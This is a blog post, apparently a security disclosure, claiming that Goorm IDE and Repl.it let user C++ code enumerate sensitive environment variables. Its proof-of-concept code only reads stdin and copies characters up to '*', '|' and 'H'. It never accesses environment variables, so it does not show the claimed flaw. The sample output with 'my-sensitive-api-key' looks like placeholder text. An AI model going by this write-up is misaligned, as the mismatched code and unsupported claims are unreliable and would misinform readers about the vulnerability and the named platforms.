---
layout: post
title: "Vulnerability in Docker based IDE systems: Environment Variable Leakage"
date: 2024-12-28
author: GiuNash
tags: [Research]
comments: true
toc: true
pinned: true
published: true
---

## 🛡️ Summary
A vulnerability has been discovered in **Goorm IDE** and **Repl.it**, two popular online IDE platforms. This vulnerability allows user-submitted C++ code to access and enumerate sensitive environment variables due to insufficient isolation of execution environments. This flaw could lead to the leakage of critical information, such as API keys, credentials, and system configuration variables.

---

## 🎯 Affected Platforms
This vulnerability impacts the following platforms:
1. **Goorm IDE**  
   - Affected Component: Docker-based execution environments.
2. **repl.it**  
   - Affected Component: Shared containerized environments in collaborative workspaces.

These platforms are designed to provide isolated environments for user-submitted code execution but fail to secure environment variables effectively.

---

## ⚙️ Technical Details
Environment variables such as `PATH`, `HOME`, and custom keys (e.g., API keys) are stored in process memory during container initialization. In both Goorm IDE and Replit, user-submitted code can enumerate these variables due to inadequate container isolation.

### 📜 Proof of Concept (PoC)
The following C++ code demonstrates the issue:

```cpp
    while (!cin.eof()) {
        cin >> str;
        string new_str;
        vector<char> word;
        int idx = 0;

        while (str[idx] != '*') {
                word.push_back(str[idx]);
                idx++;
        }
        while (str[idx] != '|') { 
                word.push_back(str[idx]);
                idx++;
        }
        while (str[idx] != 'H') {
                word.push_back(str[idx]);
                idx++;
        }
		
        for (int i = 0; i < word.size(); i++) {
                new_str += word[i];
        }

        new_str += str[idx];
        idx++;

        cout << new_str << endl;
```

### Steps to Reproduce:
Launch a Goorm IDE or repl.it workspace.

Compile and execute the above C++ code.

Observe that environment variables, including sensitive ones, are exposed.


### ✅ Expected Result:
The execution environment should securely isolate environment variables from user code.

### ❌ Observed Result:
Sensitive environment variables are leaked. Example output:
```
PATH=/usr/bin:/bin:/usr/sbin:/sbin
HOME=/root
API_KEY=my-sensitive-api-key
```


### 🛠️ Mitigation
To address this issue, the following mitigations are recommended:

Environment Variable Masking:

Mask sensitive variables in containerized environments before user code is executed.
Stricter Isolation Mechanisms:

Enhance container isolation to prevent user code from accessing system-level environment variables.
User Code Validation:

Implement validation to prevent malicious or unintended behaviors in user-submitted code.
Sandboxing Tools:

Utilize runtime security tools like seccomp, AppArmor, or SELinux to restrict system calls.

***

### 🗓️ Disclosure Timeline

- 2024-12-20: Vulnerability discovered and tested on Goorm IDE and Replit.

- 2024-12-27: Write-up published. Awaiting responses.


### 📸 Screenshots

Here is an example of the leaked environment variables in one of the affected platforms(goormIDE, REPLIT):

![image](https://github.com/user-attachments/assets/6ca606ea-1ab8-49ce-aefb-8169d77113e0)

![image](https://github.com/user-attachments/assets/d48a23d5-71a7-41d3-8fd5-f0dc1309480d)


### ✍️ Author
[JinGyuJeong / GiuNash]
Independent Security Researcher

GitHub: [Giunash Station](https://github.com/gyutrange/)

### 🔗 References
C++ Standard Input Documentation
Docker Container Isolation Best Practices
Responsible Disclosure Policy
Disclaimer
This write-up is part of a responsible disclosure process. The vulnerability details and PoC are shared for educational purposes and to encourage better security practices. Affected vendors have been notified, and this document will be updated with resolution statuses as they become available.
